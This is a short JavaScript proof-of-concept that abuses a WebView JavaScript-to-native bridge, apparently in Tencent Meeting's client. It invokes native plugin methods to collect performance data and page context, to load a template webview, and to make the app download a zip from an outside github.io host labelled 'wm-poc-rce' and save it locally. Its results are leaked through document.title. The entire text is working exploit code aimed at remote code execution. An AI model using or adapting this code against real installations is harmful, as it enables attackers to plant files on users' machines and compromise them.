(function(){
  document.title='P119MAIN:'+location.host+':'+location.protocol;
  window.__m=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P119MCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__m',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P119MAIN-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P119MAIN-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p97avatar.zip';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['CX','CommonPlugin','GetWebPageRunningContext',{}],
    ['EF','CommonPlugin','ExportFile',{
      fileName:'p119.bin',
      contentType:'application/octet-stream',
      url:zip
    }],
    ['LT','CommonPlugin','LoadTemplateWebView',{
      url:'https://meeting.tencent.com/v2/webview/keep-app-alive',
      process_pattern:0,
      from_webView:true
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P119MAIN-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P119MAIN-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 15000);
})();
